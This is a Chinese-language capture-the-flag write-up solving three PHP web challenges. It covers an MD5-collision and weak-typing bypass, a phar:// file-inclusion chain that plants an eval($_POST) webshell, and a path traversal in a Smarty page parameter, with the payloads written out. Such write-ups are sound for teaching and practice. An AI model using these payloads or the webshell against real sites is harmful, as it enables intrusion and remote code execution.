### Writeup

[TOC]

#### 漏洞利用

##### bypass

利用PHP弱类型比较绕过，题目要求a和b不同而md5值相同，只需要找到符合这个条件的数据即可，使用GET传递

```
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

is_numeric函数会检查输入是否是数字或数字字符串，只需要插入字母即可绕过，并要求passwd==123456，在弱类型比较下，123456a==123456。num使用科学计数法绕过，只需要传递1e8就会被解析为100000000，使用POST传递

```
passwd=123456a&num=1e8
```

##### php-include

扫描目录找到include.php和upload.php，大概是上传一个webshell并include执行的题目。include.php中提示了参数为file，尝试伪协议读取源代码，?file=php://filter/read=convert.base64-encode/resource=include，可以发现所有被include的文件都会加上.php后缀。

![](https://notes.sjtu.edu.cn/uploads/upload_bcecbeffb85d79c57391c44aec1dd75b.png)

![](https://notes.sjtu.edu.cn/uploads/upload_1a82ddc8494caf603a41a1ee72dee264.png)

![](https://notes.sjtu.edu.cn/uploads/upload_340834646547a742c943540c81cfa2a8.png)

upload.php限制了文件扩展名，只需要编写hell.php（用于生成webshell）进行压缩，再将压缩包后缀改为.jpg，上传后得到路径。

```php
<?php file_put_contents('shell.php','<?php eval($_POST[2])?>'); ?>
```

![](https://notes.sjtu.edu.cn/uploads/upload_3d095a49281d34f98dae5de62f5e0281.png)

使用phar伪协议可以将hell.jpg内的hell.php文件执行，在网站根目录生成webshell，使用蚁剑连接即可得到flag。

```
?file=phar:///uploads/hell.jpg/hell.php
```

![](https://notes.sjtu.edu.cn/uploads/upload_62417c8a1133ed9b09ef5de578f49e08.png)

##### smarty

在主要代码中未对用户输入进行过滤，即使有路径拼接，但可以使用路径穿越漏洞访问其他目录。

```php
if (isset($_GET['page']) && gettype($_GET['page']) === 'string') {
    $file_path = "file://" . getcwd() . "/pages/" . $_GET['page'];
    $smarty->display($file_path);
}
```

只需要输入以下payload即可。

```
?page=../../../../../../../flag
```

